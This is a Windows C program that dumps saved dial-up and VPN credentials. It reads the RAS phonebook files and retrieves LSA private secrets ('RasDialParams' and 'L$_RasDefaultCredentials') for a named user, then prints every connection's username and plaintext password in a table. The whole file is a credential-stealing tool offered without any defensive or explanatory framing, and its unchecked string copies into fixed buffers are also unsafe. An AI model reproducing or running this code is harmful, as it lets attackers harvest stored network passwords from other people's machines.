#include <windows.h>
#include <stdio.h>
#include <ras.h>
#include <raserror.h>
#include <Ntsecapi.h>
#include <Sddl.h>
#include <Wtsapi32.h>
#include <shlobj.h>
#pragma comment(lib, "Rasapi32.lib")
#pragma comment(lib, "Wtsapi32.lib")

typedef struct _tagRASDIALPINFO
{
	CHAR  szEntryName[RAS_MaxEntryName + 1];
	CHAR  szDeviceType[RAS_MaxDeviceType + 1];
	CHAR  szDeviceName[RAS_MaxDeviceName + 1];
	CHAR  szPhoneNumber[RAS_MaxPhoneNumber + 1];
	CHAR  szUserName[UNLEN + 1];
	CHAR  szPassword[PWLEN + 1];
}RASDIALPINFO, *PRASDIALPINFO;

typedef struct _tagRASDIALPINFOLIST
{
	ULONG ulCount;
	RASDIALPINFO rdi[1];
}RASDIALPINFOLIST, *PRASDIALPINFOLIST;

typedef struct _tagPASSWORDS
{
	CHAR uid[256];
	CHAR pass[256];
	CHAR login[256];
}PASSWORDS, *PPASSWORDS;

const char* user = NULL;

void StrToLsaStr(LPSTR AValue, PLSA_UNICODE_STRING lsa)
{
	DWORD dwSize = 0;
	dwSize = MultiByteToWideChar(CP_ACP, NULL, AValue, -1, NULL, NULL);
	lsa->Length = (dwSize - 1) * 2;
	lsa->MaximumLength = lsa->Length;
	lsa->Buffer = (LPWSTR)malloc(lsa->MaximumLength);
	MultiByteToWideChar(CP_ACP, NULL, AValue, strlen(AValue), lsa->Buffer, dwSize - 1);
}

LPSTR get_local_sid()
{
	union
	{
		SID s;
		char c[256];
	}Sid;

	typedef BOOL(WINAPI *ConvertSid2StringSid)(PSID, LPTSTR*);

	DWORD dwSidSize = 0;
	DWORD dwDomainNameSize = 0;
	CHAR szDomainName[256] = { 0 };

	LPSTR pSid = NULL;
	SID_NAME_USE peUse;

	HINSTANCE hLibrary = NULL;

	dwSidSize = sizeof(Sid);
	dwDomainNameSize = sizeof(szDomainName);

	if (!LookupAccountName(NULL, user, &Sid, &dwSidSize, szDomainName, &dwDomainNameSize, &peUse))
		return NULL;

	if (!IsValidSid(&Sid))
		return NULL;

	hLibrary = LoadLibrary("advapi32.dll");
	if (hLibrary == NULL)
		return NULL;

	ConvertSid2StringSid proc = (ConvertSid2StringSid)GetProcAddress(hLibrary, "ConvertSidToStringSidA");
	if (proc != NULL)
	{
		//Convert
		proc(&Sid.s, &pSid);
		FreeLibrary(hLibrary);
		return pSid;
	}
	else
	{
		FreeLibrary(hLibrary);
		return NULL;
	}

	return NULL;
}

PLSA_UNICODE_STRING get_lsa_data(LPTSTR KeyName)
{
	NTSTATUS status;
	LSA_HANDLE LsaHandle;
	LSA_OBJECT_ATTRIBUTES LsaObjectAttribs = { 0 };
	LSA_UNICODE_STRING LsaKeyName;
	PLSA_UNICODE_STRING OutData;

	status = LsaOpenPolicy(NULL, &LsaObjectAttribs, POLICY_GET_PRIVATE_INFORMATION, &LsaHandle);
	if (status != 0)
		return NULL;

	StrToLsaStr(KeyName, &LsaKeyName);

	status = LsaRetrievePrivateData(LsaHandle, &LsaKeyName, &OutData);

	free(LsaKeyName.Buffer);

	if (status != 0)
		return NULL;

	status = LsaClose(LsaHandle);

	if (status != 0)
		return NULL;

	return OutData;
}

void parse_lsa_data(PASSWORDS* pass, LPCWSTR Buffer, USHORT Length)
{
	char AnsiPsw[1024] = { 0 };
	int index = 0;
	WideCharToMultiByte(CP_ACP, 0, Buffer, Length / 2, AnsiPsw, sizeof(AnsiPsw), 0, 0);
	for (int i = 0; i < Length / 2 - 1; ++i)
	{
		for (int j = 0; j < 10; ++j)
		{
			switch (j)
			{
			case 0:
				strcpy(pass[index].uid, AnsiPsw + i);
				break;
			case 5:
				strcpy(pass[index].login, AnsiPsw + i);
				break;
			case 6:
				strcpy(pass[index].pass, AnsiPsw + i);
				break;
			}
			i += strlen(AnsiPsw + i) + 1;
		}
		++index;
	}
}

void get_lsa_pass(PASSWORDS* pass)
{
	char Win2k[] = "RasDialParams!%s#0";
	char WinXP[] = "L$_RasDefaultCredentials#0";
	char temp[256];
	PLSA_UNICODE_STRING PrivateData = NULL;

	sprintf(temp, Win2k, get_local_sid());

	PrivateData = get_lsa_data(temp);
	if (PrivateData != NULL)
	{
		parse_lsa_data(pass, PrivateData->Buffer, PrivateData->Length);
		LsaFreeMemory(&PrivateData);
	}

	PrivateData = get_lsa_data(WinXP);
	if (PrivateData != NULL)
	{
		parse_lsa_data(pass, PrivateData->Buffer, PrivateData->Length);
		LsaFreeMemory(&PrivateData);
	}
}

int get_item_count()
{
	int nCount = 0;
	LPSTR lpszPhoneBook[2];
	CHAR szSectionNames[1024] = { 0 };
	CHAR szPhoneBook1[MAX_PATH], szPhoneBook2[MAX_PATH];
	OSVERSIONINFO osi;

	osi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&osi);

	switch (osi.dwMajorVersion)
	{
	case 5:
		sprintf(szPhoneBook1, "C:\\Documents and Settings\\%s\\Application Data\\Microsoft\\Network\\Connections\\pbk\\rasphone.pbk", user);
		break;
	default:
		sprintf(szPhoneBook1, "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Network\\Connections\\pbk\\rasphone.pbk", user);
	}

	SHGetSpecialFolderPath(NULL, szPhoneBook2, 0x23, 0);
	sprintf(szPhoneBook2, "%s\\%s", szPhoneBook2, "Microsoft\\Network\\Connections\\pbk\\rasphone.pbk");

	lpszPhoneBook[0] = szPhoneBook1;
	lpszPhoneBook[1] = szPhoneBook2;

	for (int i = 0; i < _countof(lpszPhoneBook); i++)
	{
		memset(szSectionNames, 0, sizeof(szSectionNames));
		GetPrivateProfileSectionNames(szSectionNames, sizeof(szSectionNames), lpszPhoneBook[i]);
		for (LPTSTR lpSection = szSectionNames; *lpSection != '\0'; lpSection += strlen(lpSection) + 1)
			nCount++;
	}

	return nCount;
}

PRASDIALPINFOLIST get_item_info()
{
	CHAR szSectionNames[1024] = { 0 };
	CHAR szPhoneBook1[MAX_PATH], szPhoneBook2[MAX_PATH];
	LPSTR lpszPhoneBook[2];
	DWORD dwRasCount = 0;
	DWORD dwIndex = 0;
	PRASDIALPINFOLIST pRdiList = NULL;
	OSVERSIONINFO osi;

	dwRasCount = get_item_count();
	if (dwRasCount <= 0)
		return NULL;

	PASSWORDS* pass = new PASSWORDS[dwRasCount];

	get_lsa_pass(pass);

	osi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&osi);

	if (osi.dwMajorVersion < 5)
		return NULL;

	switch (osi.dwMajorVersion)
	{
	case 5:
		sprintf(szPhoneBook1, "C:\\Documents and Settings\\%s\\Application Data\\Microsoft\\Network\\Connections\\pbk\\rasphone.pbk", user);
		break;
	default:
		sprintf(szPhoneBook1, "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Network\\Connections\\pbk\\rasphone.pbk", user);
	}

	SHGetSpecialFolderPath(NULL, szPhoneBook2, 0x23, 0);
	sprintf(szPhoneBook2, "%s\\%s", szPhoneBook2, "Microsoft\\Network\\Connections\\pbk\\rasphone.pbk");

	lpszPhoneBook[0] = szPhoneBook1;
	lpszPhoneBook[1] = szPhoneBook2;

	pRdiList = (PRASDIALPINFOLIST)LocalAlloc(LPTR, sizeof(RASDIALPINFO) * dwRasCount + sizeof(ULONG));

	pRdiList->ulCount = dwRasCount;

	for (int i = 0; i < _countof(lpszPhoneBook); i++)
	{
		memset(szSectionNames, 0, sizeof(szSectionNames));

		GetPrivateProfileSectionNames(szSectionNames, sizeof(szSectionNames), lpszPhoneBook[i]);

		for (LPTSTR lpSection = szSectionNames; *lpSection != '\0'; lpSection += strlen(lpSection) + 1)
		{
			char strDialParamsUID[256] = { 0 };
			char strUserName[256] = { 0 };
			char strPassWord[256] = { 0 };
			char strPhoneNumber[256] = { 0 };
			char strDevice[256] = { 0 };

			int nBufferLen = GetPrivateProfileString(lpSection, "DialParamsUID", 0, strDialParamsUID, sizeof(strDialParamsUID), lpszPhoneBook[i]);

			if (nBufferLen > 0)
			{
				for (int j = 0; j < dwRasCount; j++)
				{
					if (stricmp(strDialParamsUID, pass[j].uid) == 0)
					{
						strcpy(strUserName, pass[j].login);
						strcpy(strPassWord, pass[j].pass);
						break;
					}
				}
			}

			GetPrivateProfileString(lpSection, "PhoneNumber", 0, strPhoneNumber, sizeof(strPhoneNumber), lpszPhoneBook[i]);
			GetPrivateProfileString(lpSection, "Device", 0, strDevice, sizeof(strDevice), lpszPhoneBook[i]);

			strcpy(pRdiList->rdi[dwIndex].szEntryName, lpSection);
			strcpy(pRdiList->rdi[dwIndex].szUserName, strUserName);
			strcpy(pRdiList->rdi[dwIndex].szPassword, strPassWord);
			strcpy(pRdiList->rdi[dwIndex].szPhoneNumber, strPhoneNumber);
			strcpy(pRdiList->rdi[dwIndex].szDeviceType, strDevice);
			strcpy(pRdiList->rdi[dwIndex].szDeviceName, strDevice);

			dwIndex++;
		}
	}

	return pRdiList;
}

void main(int argc, char** argv)
{
	PRASDIALPINFOLIST pRdiList = NULL;

	user = argv[1];

	pRdiList = get_item_info();
	if (pRdiList == NULL)
		return;
	
	printf("name\tuser\tpassword\tphone\tdevname\tdevtype\n");

	for (int i = 0; i < pRdiList->ulCount; i++)
	{
		CHAR* name = pRdiList->rdi[i].szEntryName;
		CHAR* user = pRdiList->rdi[i].szUserName;
		CHAR* password = pRdiList->rdi[i].szPassword;
		CHAR* phone = pRdiList->rdi[i].szPhoneNumber;
		CHAR* devname = pRdiList->rdi[i].szDeviceName;
		CHAR* devtype = pRdiList->rdi[i].szDeviceType;

		printf("%s\t%s\t%s\t%s\t%s\t%s\n", name, user, password, phone, devname, devtype);
	}

	LocalFree(pRdiList);
}